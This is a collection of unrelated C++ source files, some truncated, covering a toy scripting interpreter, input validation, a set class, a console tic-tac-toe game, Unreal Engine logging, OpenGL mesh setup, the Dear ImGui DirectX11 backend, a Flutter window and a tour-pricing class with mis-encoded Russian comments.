    "#include \"msrt_main.h\"\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <map>\n#include <regex>\n#include \"msrt_tokens.h\"\n#include \"msrt_log.h\"\n#include \"msrt_keywords.h\"\n#include \"msrt_types.h\"\n\n#ifndef MSRT_VERSION\n#define MSRT_VERSION \"0.0\"\n#endif\n\n\n// important maps\nstd::map<std::string, MSRT::Keyword> keywordMap;\nstd::map<std::string, MSRT::VarType> vartypeMap;\nstd::map<std::string, MSRT::Function*> functionMap; // you can expose it in msrt_main.h with #define MSRT_CUSTOM_FUNCTIONS_NEEDED\n\nstd::vector<MSRT::Sentence> program;\nstd::vector<std::string> tempVarNames; // only for analysis\n\n\n// maps for variables\nstd::map<std::string, MSRT::VarType> variablesTypes;\n\nstd::map<std::string, std::string> varText;\nstd::map<std::string, int> varInteger;\nstd::map<std::string, double> varReal;\n\n\nint currLine; // current line in program\n\nvoid MSRT::Run() {\n\n\t// for each sentence -> <sentence>.RunSentence();\n\n\tfor (currLine = 0; currLine < program.size(); currLine++) {\n\t\tif (program.at(currLine).tokens.size() > 0)\n\t\t\tprogram.at(currLine).RunSentence();\n\t}\n\tstd::cout << \"\\n\\n\";\n}\n\n\nclass MSRTLogFunction : public MSRT::Function {\npublic:\n\tvoid Execute(std::vector<MSRT::FunctionArgument> args) {\n\t\tfor (int i = 0; i < args.size(); i++) {\n\t\t\tfor (int j = 0; j < args.at(i).data.size(); j++) {\n\t\t\t\tif (args.at(i).data.at(j) == '\\\\') {\n\t\t\t\t\tif (args.at(i).data.at(j + 1) == 'n') std::cout << \"\\n\";\n\t\t\t\t\tj += 1;\n\t\t\t\t}\n\t\t\t\telse std::cout << args.at(i).data.at(j);\n\t\t\t}\n\t\t}\n\t}\n};\n\n\nclass MSRTEvalFunction : public MSRT::Function {\npublic:\n\tvoid Execute(std::vector<MSRT::FunctionArgument> args) {\n\t\tfor (int i = 0; i < args.size(); i++) {\n\t\t\tstd::vector<MSRT::Sentence> sentences = MSRT::Parse(args.at(i).data, false);\n\t\t\tfor (int j = 0; j < sentences.size(); j++) {\n\t\t\t\tif(sentences.at(i).tokens.size() != 0) sentences.at(i).RunSentence();\n\t\t\t}\n\t\t}\n\t}\n};\n\n\nclass MSRTWhileFunction : public MSRT::Function {\npublic:\n\tvoid Execute(std::vector<MSRT::FunctionArgument> args) {\n\t\tint start = currLine + 1;\n\t\tint stop = program.size() - 1;\n\t\tfor (int i = start; i < program.size(); i++) {\n\t\t\tfor (int j = 0; j < program.at(i).tokens.size(); j++) {\n\t\t\t\tif (program.at(i).tokens.at(j).type == MSRT::TokenType::KEYWORD) {\n\t\t\t\t\tif (keywordMap.at(program.at(i).tokens.at(j).tokenContent) == MSRT::Keyword::SCOPEEND) stop = i;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif (args.at(0).data == \"True\") {\n\t\t\twhile(true){\n\t\t\t\tfor (int i = start; i < stop; i++) {\n\t\t\t\t\tif(program.at(i).tokens.size() != 0) program.at(i).RunSentence();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n};\n\nvoid MSRT::InitKeywordMap() {\n\tkeywordMap.insert_or_assign(\"declare\", MSRT::Keyword::DECLARE);\n\tkeywordMap.insert_or_assign(\"True\", MSRT::Keyword::TRUE);\n\tkeywordMap.insert_or_assign(\"False\", MSRT::Keyword::FALSE);\n\tkeywordMap.insert_or_assign(\"Getline\", MSRT::Keyword::GETLINE);\n\n\tkeywordMap.insert_or_assign(\"{\", MSRT::Keyword::SCOPESTART);\n\tkeywordMap.insert_or_assign(\"}\", MSRT::Keyword::SCOPEEND);\n}\n\nvoid MSRT::InitVarTypeMap() {\n\tvartypeMap.insert_or_assign(\"Void\", MSRT::VarType::VOID);\n\tvartypeMap.insert_or_assign(\"Integer\", MSRT::VarType::INTEGER);\n\tvartypeMap.insert_or_assign(\"Real\", MSRT::VarType::REAL);\n\tvartypeMap.insert_or_assign(\"Boolean\", MSRT::VarType::BOOLEAN);\n\tvartypeMap.insert_or_assign(\"Text\", MSRT::VarType::TEXT);\n\tvartypeMap.insert_or_assign(\"Vec2\", MSRT::VarType::VEC2);\n\tvartypeMap.insert_or_assign(\"Vec3\", MSRT::VarType::VEC3);\n\tvartypeMap.insert_or_assign(\"Int3\", MSRT::VarType::INT3);\n\tvartypeMap.insert_or_assign(\"Ident\", MSRT::VarType::IDENT);\n}\n\nvoid MSRT::InitFunctionMap() {\n\tfunctionMap.insert_or_assign(\"log\", new MSRTLogFunction);\n\tfunctionMap.insert_or_assign(\"while\", new MSRTWhileFunction);\n\tfunctionMap.insert_or_assign(\"eval\", new MSRTEvalFunction);\n}\n\nstd::vector<MSRT::Sentence> MSRT::Parse(std::string data, bool verboseparsing) {\n\tstd::vector<MSRT::Sentence> tempProgram;\n\tstd::vector<MSRT::Sentence> tempProgram2;\n\tbool inComment = false;\n\tbool inSingleLineComment = false;\n\tbool inMagic = false;\n\tMSRT::Sentence newSentence;\n\tMSRT::Token newToken;\n\tnewToken.type = TokenType::UNDEFINED;\n\tfor (int i = 0; i < data.size(); i++) {\n\n\t\tif (data.at(i) == ';' && verboseparsing) {\n\t\t\tstd::cout << \"inComment: \" << inComment << \"\\n\";\n\t\t\tstd::cout << \"inSingleLineComment: \" << inSingleLineComment << \"\\n\";\n\t\t\tstd::cout << \"inMagic: \" << inMagic << \"\\n\";\n\t\t\tif (i + 1 < data.size()) std::cout << \"Next character: \" << data.at(i + 1);\n\t\t\tstd::cout << \"---\\n\\n\";\n\t\t}\n\n\t\tif (!inComment && !inSingleLineComment && !inMagic) {\n\n\t\t\tif (data.at(i) == '/') {\n\t\t\t\tif (data.at(i + 1) == '*') {\n\t\t\t\t\tinComment = true;\n\t\t\t\t\tif (verboseparsing) MSRT::Log(MSRT::LogType::INFO, \"Crossed comment.\");\n\t\t\t\t\ti++;\n\t\t\t\t}\n\t\t\t\telse if (data.at(i + 1) == '/') {\n\t\t\t\t\tinSingleLineComment = true;\n\t\t\t\t\tif (verboseparsing) MSRT::Log(MSRT::LogType::INFO, \"Crossed single line comment.\");\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t\tif ((data.at(i) == '+' || data.at(i) == '-' || data.at(i) == '*' || data.at(i) == '/' || data.at(i) == '^' || data.at(i) == '=') &",
    "#include \"input_check.h\"\n\nnamespace inpch {\n\n    content_type content_type_of(const std::string &content_string) {\n        if (content_string.empty()) throw std::length_error(\"content_string\");\n        bool digit = false, text  = false;\n        for (const char  &ch : content_string) {\n            digit |= std::isdigit(ch);\n            text  |= std::isalpha(ch);\n        }\n        if (digit && text) return content_type::text_with_numbers;\n        if (digit) return content_type::number;\n        return content_type::text;\n    }\n\n    content_type content_type_of(const std::wstring  &content_string) {\n        if (content_string.empty()) throw std::length_error(\"content_string\");\n        bool digit = false, text  = false;\n        for (const wchar_t  &ch : content_string) {\n            digit |= std::isdigit(ch);\n            #if defined(__MINGW64__) || defined(__MINGW32__)\n            text  |= std::isalpha(ch) ||\n                    (rus_alphabet.find(ch) != rus_alphabet.end()) ||\n                    (RUS_alphabet.find(ch) != RUS_alphabet.end());\n            #else\n            text  |= std::isalpha(ch);\n            #endif\n        }\n        if (digit && text) return content_type::text_with_numbers;\n        if (digit) return content_type::number;\n        return content_type::text;\n    }\n\n    bool input_match(const std::string &input_string, const std::string &regex_string) {\n        return std::regex_match(input_string, std::regex(regex_string));\n    }\n\n    bool input_match(const std::string &input_string, const std::regex &regex) {\n        return std::regex_match(input_string, regex);\n    }\n\n    int int_input_loop(const int &l, const int &r, const std::string &err, bool in_range) {\n        int input;\n        while (true) {\n            std::cin >> input;\n            if (std::cin.fail()) {\n                std::cin.clear();\n                continue;\n            }\n            if (!input_check<int>(input, l, r, in_range).is_correct()) {\n                std::cerr << err << std::endl;\n                continue;\n            }\n            return input;\n        }\n    }\n\n    int int_input_loop(const int &l, const int &r, const std::wstring &err, bool in_range) {\n        int input;\n        while (true) {\n            std::wcin >> input;\n            if (std::wcin.fail()) {\n                std::wcin.clear();\n                continue;\n            }\n            if (!input_check<int>(input, l, r, in_range).is_correct()) {\n                std::wcerr << err << std::endl;\n                continue;\n            }\n            return input;\n        }\n    }\n\n    std::string str_num_input_loop(const base_type &base, const std::string &err, const int &length) {\n        std::string input;\n        while (true) {\n            std::getline(std::cin, input);\n            if (std::cin.fail()) {\n                std::cin.clear();\n                continue;\n            }\n            if (!input_check<std::string>(input, length, base).is_correct()) {\n                std::cerr << err << std::endl;\n                continue;\n            }\n            return input;\n        }\n    }\n\n    std::wstring wstr_num_input_loop(const base_type &base, const std::wstring &err, const int &length) {\n        std::wstring input;\n        while (true) {\n            std::getline(std::wcin, input);\n            if (std::cin.fail()) {\n                std::cin.clear();\n                continue;\n            }\n            if (!input_check<std::wstring>(input, length, base).is_correct()) {\n                std::wcerr << err << std::endl;\n                continue;\n            }\n            return input;\n        }\n    }\n\n} // inpch",
    "#include <iostream>\n#include \"set.h\"\nvoid CSet::print()\n{\n    std::cout << '[';\n    for (int el : els) std::cout << el << ',';\n    std::cout << ']';\n}\nvoid CSet::include(int el)\n{\n    els.push_back(el);\n    size++;\n}\nvoid CSet::exclude(int el)\n{\n    for (int i = 0; i < size; i++)\n    {\n        if (els[i] == el)\n        {\n            els.erase(els.begin() + i);\n            size--;\n        }\n    }\n}\n\nbool CSet::contains(int el) const\n{\n    for (int x : els)\n    {\n        if (x == el) return true;\n    }\n    return false;\n}\n\nint CSet::operator[](unsigned index)\n{\n    return els.at(index);\n}\n\nconst CSet operator+(const CSet& set1, const CSet& set2)\n{\n    CSet result_set;\n    for (int x : set1.els)\n    {\n        if (!result_set.contains(x)) result_set.include(x);\n    }\n    for (int x : set2.els)\n    {\n        if (!result_set.contains(x)) result_set.include(x);\n    }\n    return result_set;\n}\n\nconst CSet operator-(const CSet& set1, const CSet& set2)\n{\n    CSet result_set;\n    for (int x : set1.els)\n    {\n        if (!set2.contains(x)) result_set.include(x);\n    }\n    return result_set;\n}\n\nconst CSet operator*(const CSet& set1, const CSet& set2)\n{\n    CSet result_set;\n    for (int x : set1.els)\n    {\n        if (set2.contains(x)) result_set.include(x);\n    }\n    return result_set;\n}\n",
    "\ufeff#include \"includes.h\"\n\n\nvoid ShowConsoleCursor(bool showFlag)\n{\n    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    CONSOLE_CURSOR_INFO     cursorInfo;\n\n    GetConsoleCursorInfo(out, &cursorInfo);\n    cursorInfo.bVisible = showFlag; // set the cursor visibility\n    SetConsoleCursorInfo(out, &cursorInfo);\n}\n/*\nint main()\n{\n    std::cout << \"Hello World\" << std::endl;\n    int n;\n    std::cin >> n;\n    std::cout << ++n;\n    ShowConsoleCursor(false);\n    system(\"pause\");\n}*/\n\nvoid setCursor(int x, int y) {\n    // T\u1ea1o m\u1ed9t c\u1ea5u tr\u00fac COORD \u0111\u1ec3 l\u01b0u tr\u1eef t\u1ecda \u0111\u1ed9 x, y\n    COORD coord;\n    coord.X = x;\n    coord.Y = y;\n\n    // L\u1ea5y handle c\u1ee7a console output\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    // S\u1eed d\u1ee5ng h\u00e0m SetConsoleCursorPosition \u0111\u1ec3 di chuy\u1ec3n con tr\u1ecf\n    SetConsoleCursorPosition(hConsole, coord);\n}\n\n//-3275-3272-3277-3280\n//52565450\nvoid control(int* ptr_x, int* ptr_y, int left, int top, int* ptr_cnt) {\n    int x = *ptr_x, y = *ptr_y;\n    int X = (x - left) / 2 + 1;\n    int Y = y - top +1;\n    int cnt = *ptr_cnt;\n    string s[4] = { \"   \" , \" x \" , \" o \" , \"[]\" };\n    setCursor(1, 1);\n    //cout << \" \" << int(_getch());\n    int keys[] = { 13, 'S', 'W', 'E' ,'A' , 72};\n    for (int i = 0; i < 6; i++) {\n        int v = GetAsyncKeyState(keys[i]);\n        if (v & 1) {\n            //sound_kick();\n            setCursor(x, y);\n            cout << s[f[Y][X]];\n            switch (keys[i])\n            {\n                //setColor(10, 0);\n                //se\n            case 'E':\n                if (f[Y][X + 1] != 4) X++;\n                //setCursor(1, 1);\n                //setColor(9, 2);\n                //cout << f[Y][X];\n                break;\n            case 'W':\n                if (f[Y - 1][X] != 4) Y--;\n                //cout << \"nhan phim W\" ; \n                break;\n            case 'S':\n                if (f[Y + 1][X] != 4) Y++;\n                //cout << \"nhan phim S\";\n                break;\n            case 'A':\n                if (f[Y][X - 1] != 4)X -- ;\n                //cout << \"nhan phim A\";\n                break;\n            case 13:\n                sound_kick();\n                if (f[Y][X] == 0) {\n                    if (cnt % 2 == 0)f[Y][X] = 2;else\n                        f[Y][X] = 1;\n                    cnt++;\n                }\n                break;\n            }\n            //setCursor(0, *ptr_cnt);\n            //cout << x << \" \" << y << \" \" << \"nhan phim \" << ch <<\" f : \" <<f[y-top][(x-left)/2+1];\n        }\n    }\n    //sound_kick();\n    *ptr_cnt = cnt;\n    x = (X - 1) * 2 + left;\n    y = Y + top - 1;\n    *ptr_x = x;\n    //setCursor(20, 20);\n    *ptr_y = y;\n    //cout << Y << \" \" << X;\n    int green = 10 ;\n    int aqua = 11;\n    int red = 12;\n    setCursor(x, y);\n    drawing.setColor(green, 0);\n    cout << \"[ ]\";\n    setCursor(x + 1, y);\n    switch (f[Y][X]) {\n    case 0:\n        cout << \" \";\n        break;\n    case 1:\n        drawing.setColor(red, 0);\n        cout << \"x\";\n        break;\n    case 2:\n        drawing.setColor(aqua, 0);\n        cout << \"o\";\n        break;\n    }\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"BaseGeometryActor.h\"\n#include \"Engine/Engine.h\"\n\nDEFINE_LOG_CATEGORY_STATIC(LogBaseGeometry, All, All);\n\n// Sets default values\nABaseGeometryActor::ABaseGeometryActor()\n{\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n\tBaseMesh = CreateDefaultSubobject<UStaticMeshComponent>(\"BaseMesh\");\n\tSetRootComponent(BaseMesh);\n}\n\n// Called when the game starts or when spawned\nvoid ABaseGeometryActor::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tFTransform Transform = GetActorTransform();\n\tFVector Location = Transform.GetLocation();\n\tFRotator Rotation =  Transform.Rotator();\n\tFVector Scale = Transform.GetScale3D();\n\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"Actor name %s\"), *GetName());\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"Transform %s\"), *Transform.ToString());\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"Location %s\"), *Location.ToString());\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"Rotation %s\"), *Rotation.ToString());\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"Scate %s\"), *Scale.ToString());\n\n\tUE_LOG(LogBaseGeometry, Error, TEXT(\"Transform %s\"), *Transform.ToHumanReadableString());\n\n\tPrintStringTypes();\n\n\tPrintTypes();\n}\n\n// Called every frame\nvoid ABaseGeometryActor::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n}\n\nvoid ABaseGeometryActor::PrintTypes()\n{\n\t\n\t\n\t//UE_LOG(LogTemp, Display, TEXT(\"Hello Unreal\"));\n\t//UE_LOG(LogTemp, Warning, TEXT(\"Hello Unreal\"));\n\t//UE_LOG(LogTemp, Error, TEXT(\"Hello Unreal\"));\n\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"Weapons num: %d, kills num: %i\"), WeaponsNum, KillsNum);\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"Health: %f\"), Health);\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"Health: %.3f\"), Health);\n\t\t\t\t\t\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"IsDead: %d\"), IsDead);\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"HasWeapon: %d\"), static_cast<int32>(HasWeapon));\n}\n\nvoid ABaseGeometryActor::PrintStringTypes()\n{\n\tUE_LOG(LogBaseGeometry, Display, TEXT(\"info\"));\n\n\tFString Name = \"John Connor\";\n\tUE_LOG(LogBaseGeometry, Display, TEXT(\"Name: %s\"), *Name)\n\n\tFString WeaponNumStr = \"Weapons num = \" + FString::FromInt(WeaponsNum);\n\tFString HealthStr = \"Health = \" + FString::SanitizeFloat(Health);\n\tFString IsDeadStr = \"Is dead = \" + FString(IsDead ? \"true\" : \"false\");\n\n\tFString Stat = FString::Printf(TEXT(\" \\n==All Stat:==\\n%s \\n%s \\n%s\"), *WeaponNumStr, *HealthStr, *IsDeadStr);\n\tUE_LOG(LogBaseGeometry, Warning, TEXT(\"%s\"), *Stat);\n\n\tGEngine->AddOnScreenDebugMessage(-1, 3.0f, FColor::Red, Name);\n\tGEngine->AddOnScreenDebugMessage(-1, 5.0f, FColor::Green, Stat, true, FVector2D(1.5f, 1.5f));\n}\n\n",
    "#include \"Mesh.h\"\n\nMesh::Mesh(std::vector<Vertex> vertices, std::vector<unsigned int> indices, std::vector<Texture> textures)\n    : vertices(vertices), indices(indices), textures(textures)\n{\n    setupMesh();\n}\n\nvoid Mesh::Draw(const Shader& shader) const\n{\n    unsigned int diffuseNr = 1;\n    unsigned int specularNr = 1;\n    for (unsigned int i = 0; i < textures.size(); i++)\n    {\n        glActiveTexture(GL_TEXTURE0 + i);\n        std::string number;\n        std::string name = textures[i].type;\n        if (name == \"texture_diffuse\")\n            number = std::to_string(diffuseNr++);\n        else if (name == \"texture_specular\")\n            number = std::to_string(specularNr++);\n\n        shader.setInt((name + number).c_str(), i);\n        glBindTexture(GL_TEXTURE_2D, textures[i].id);\n    }\n\n    glBindVertexArray(VAO);\n    glDrawElements(GL_TRIANGLES, static_cast<unsigned int>(indices.size()), GL_UNSIGNED_INT, 0);\n    glBindVertexArray(0);\n\n    glActiveTexture(GL_TEXTURE0);\n}\n\nvoid Mesh::setupMesh()\n{\n    glGenVertexArrays(1, &VAO);\n    glGenBuffers(1, &VBO);\n    glGenBuffers(1, &EBO);\n\n    glBindVertexArray(VAO);\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(Vertex), &vertices[0], GL_STATIC_DRAW);\n\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, indices.size() * sizeof(unsigned int), &indices[0], GL_STATIC_DRAW);\n\n    glEnableVertexAttribArray(0);\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), (void*)0);\n    glEnableVertexAttribArray(1);\n    glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), (void*)offsetof(Vertex, Normal));\n    glEnableVertexAttribArray(2);\n    glVertexAttribPointer(2, 2, GL_FLOAT, GL_FALSE, sizeof(Vertex), (void*)offsetof(Vertex, TexCoords));\n\n    glBindVertexArray(0);\n}\n",
    "// dear imgui: Renderer Backend for DirectX11\n// This needs to be used along with a Platform Backend (e.g. Win32)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'ID3D11ShaderResourceView*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Support for large meshes (64k+ vertices) with 16-bit indices.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-05-19: DirectX11: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-02-18: DirectX11: Change blending equation to preserve alpha in output buffer.\n//  2019-08-01: DirectX11: Fixed code querying the Geometry Shader state (would generally error with Debug layer enabled).\n//  2019-07-21: DirectX11: Backup, clear and restore Geometry Shader is any is bound when calling ImGui_ImplDX10_RenderDrawData. Clearing Hull/Domain/Compute shaders without backup/restore.\n//  2019-05-29: DirectX11: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: DirectX11: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2018-12-03: Misc: Added #pragma comment statement to automatically link with d3dcompiler.lib when using D3DCompile().\n//  2018-11-30: Misc: Setting up io.BackendRendererName so it can be displayed in the About Window.\n//  2018-08-01: DirectX11: Querying for IDXGIFactory instead of IDXGIFactory1 to increase compatibility.\n//  2018-07-13: DirectX11: Fixed unreleased resources in Init and Shutdown functions.\n//  2018-06-08: Misc: Extracted imgui_impl_dx11.cpp/.h away from the old combined DX11+Win32 example.\n//  2018-06-08: DirectX11: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplDX11_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2016-05-07: DirectX11: Disabling depth-write.\n\n#include \"imgui.h\"\n#include \"imgui_impl_dx11.h\"\n\n// DirectX\n#include <stdio.h>\n#include <d3d11.h>\n#include <d3dcompiler.h>\n#ifdef _MSC_VER\n#pragma comment(lib, \"d3dcompiler\") // Automatically link with d3dcompiler.lib as we are using D3DCompile() below.\n#endif\n\n// DirectX11 data\nstruct ImGui_ImplDX11_Data\n{\n    ID3D11Device*               pd3dDevice;\n    ID3D11DeviceContext*        pd3dDeviceContext;\n    IDXGIFactory*               pFactory;\n    ID3D11Buffer*               pVB;\n    ID3D11Buffer*               pIB;\n    ID3D11VertexShader*         pVertexShader;\n    ID3D11InputLayout*          pInputLayout;\n    ID3D11Buffer*               pVertexConstantBuffer;\n    ID3D11PixelShader*          pPixelShader;\n    ID3D11SamplerState*         pFontSampler;\n    ID3D11ShaderResourceView*   pFontTextureView;\n    ID3D11RasterizerState*      pRasterizerState;\n    ID3D11BlendState*           pBlendState;\n    ID3D11DepthStencilState*    pDepthStencilState;\n    int                         VertexBufferSize;\n    int                         IndexBufferSize;\n\n    ImGui_ImplDX11_Data()       { memset(this, 0, sizeof(*this)); VertexBufferSize = 5000; IndexBufferSize = 10000; }\n};\n\nstruct VERTEX_CONSTANT_BUFFER\n{\n    float   mvp[4][4];\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplDX11_Data* ImGui_ImplDX11_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplDX11_Data*)ImGui::GetIO().BackendRendererUserData : NULL;\n}\n\n// Functions\nstatic void ImGui_ImplDX11_SetupRenderState(ImDrawData* draw_data, ID3D11DeviceContext* ctx)\n{\n    ImGui_ImplDX11_Data* bd = ImGui_ImplDX11_GetBackendData();\n\n    // Setup viewport\n    D3D11_VIEWPORT vp;\n    memset(&vp, 0, sizeof(D3D11_VIEWPORT));\n    vp.Width = draw_data->DisplaySize.x;\n    vp.Height = draw_data->DisplaySize.y;\n    vp.MinDepth = 0.0f;\n    vp.MaxDepth = 1.0f;\n    vp.TopLeftX = vp.TopLeftY = 0;\n    ctx->RSSetViewports(1, &vp);\n\n    // Setup shader and vertex buffers\n    unsigned in",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n//#include \"stdafx.h\"\nusing namespace std;\nclass expo // \u00ca\u00eb\u00e0\u00f1\u00f1 \u00fd\u00ea\u00f1\u00ef\u00ee\u00ed\u00e5\u00ed\u00f2\n{\n    string name;   // \u00c8\u00ec\u00ff\n    double cost;   // \u00d1\u00f2\u00ee\u00e8\u00ec\u00ee\u00f1\u00f2\u00fc \u00ee\u00e4\u00ed\u00ee\u00e3\u00ee \u00e4\u00ed\u00ff \u00fd\u00ea\u00f1\u00ef\u00ee\u00ed\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff\n    int duration;  // \u00c2\u00f0\u00e5\u00ec\u00ff \u00fd\u00ea\u00f1\u00ef\u00ee\u00ed\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff\n    double price;  // \u00d6\u00e5\u00ed\u00e0 \u00e7\u00e0 \u00e2\u00f1\u00e5 \u00fd\u00ea\u00f1\u00ef\u00ee\u00ed\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00e5\npublic:\n    expo() // \u00ca\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0 \u00e1\u00e5\u00e7 \u00ef\u00e0\u00f0\u00e0\u00ec\u00e5\u00f2\u00f0\u00ee\u00e2 \u00f1\u00ee\u00e7\u00e4\u00e0\u00e5\u00f2 \"\u00ef\u00f3\u00f1\u00f2\u00ee\u00e9\" \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\n    {\n        price = 0;\n        duration = 0;\n        cost = 0;\n    }\n    void set(string na, double r, int d, double p) // \u00d4\u00f3\u00ed\u00ea\u00f6\u00e8\u00ff \u00e4\u00eb\u00ff \u00e8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00e8 \u00ef\u00ee\u00eb\u00e5\u00e9 \u00e4\u00eb\u00ff\n        // \u00f1\u00ee\u00e7\u00e4\u00e0\u00ed\u00ed\u00ee\u00e3\u00ee \"\u00ef\u00f3\u00f1\u00f2\u00ee\u00e3\u00ee\" \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0\n    {\n        price = p;\n        name = na; // \u00ca\u00ee\u00ef\u00e8\u00f0\u00f3\u00e5\u00ec \u00f1\u00f2\u00f0\u00ee\u00ea\u00f3, \u00f1\u00ee\u00e4\u00e5\u00f0\u00e6\u00e0\u00f9\u00f3\u00fe \u00ec\u00e0\u00f0\u00ea\u00f3 \u00e0\u00e2\u00f2\u00ee\u00ec\u00ee\u00e1\u00e8\u00eb\u00ff\n        cost = r; // \u00c7\u00e0\u00e4\u00e0\u00e5\u00ec \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 \u00f0\u00e0\u00f1\u00f5\u00ee\u00e4\u00e0 \u00f2\u00ee\u00ef\u00eb\u00e8\u00e2\u00e0 \u00ed\u00e0 100 \u00ea\u00ec\n        duration = d; //\u00c7\u00e0\u00e4\u00e0\u00e5\u00ec \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 \u00e4\u00eb\u00e8\u00f2\u00e5\u00eb\u00fc\u00ed\u00ee\u00f1\u00f2\u00e8 \u00fd\u00ea\u00f1\u00ef\u00ee\u00ed\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff\n    }\n    expo(string na, double r, int d, double p) // \u00ca\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0 \u00e4\u00eb\u00ff \u00e8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00e8 \u00ef\u00ee\u00eb\u00e5\u00e9\n    {\n        price = p;\n        duration = d;\n        name = na; // \u00ca\u00ee\u00ef\u00e8\u00f0\u00f3\u00e5\u00ec \u00f1\u00f2\u00f0\u00ee\u00ea\u00f3, \u00f1\u00ee\u00e4\u00e5\u00f0\u00e6\u00e0\u00f9\u00f3\u00fe \u00ed\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00fd\u00ea\u00f1\u00ef\u00ee\u00ed\u00e5\u00ed\u00f2\u00e0\n        cost 